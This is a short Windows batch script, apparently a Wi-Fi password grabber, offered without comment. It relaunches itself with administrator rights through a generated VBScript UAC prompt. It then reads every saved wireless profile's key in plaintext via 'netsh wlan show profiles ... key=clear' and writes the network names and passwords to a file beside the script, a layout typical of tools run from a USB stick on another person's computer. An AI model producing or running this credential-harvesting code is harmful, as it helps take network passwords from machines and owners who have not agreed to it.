@echo off & setlocal enabledelayedexpansion
if _%1_==_Main_ goto :Main
:getadmin
    set vbs=%temp%\getadmin.vbs
(
    echo Set UAC = CreateObject^("Shell.Application"^)
    echo UAC.ShellExecute "%~s0", "Main %~sdp0 %*", "", "runas", 1
)> "%vbs%"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
goto :eof
:Main
Call :init
Set "PasswordLog=%~dp0passwords/_pass.txt"
for /f "skip=2 delims=: tokens=2" %%a in ('netsh wlan show profiles') do (
    if not "%%a"=="" (
        set "ssid=%%a"
        set "ssid=!ssid:~1!"
        call :Getpassword "!ssid!"
    )
)
:Getpassword
set "name=%1"
set "name=!name:"=!"
Set "passwd="
for /f "delims=: tokens=2" %%a in ('netsh wlan show profiles %1 key^=clear ^|find /I "Cont"') do (
    set "passwd=%%a"
)
If defined passwd (
    set passwd=!passwd:~1!
    echo !name!:!passwd! >> "%PasswordLog%"
)
exit /b
:init
prompt $g
for /F "delims=." %%a in ('"prompt $H. & for %%b in (1) do rem"') do set "BS=%%a"
exit /b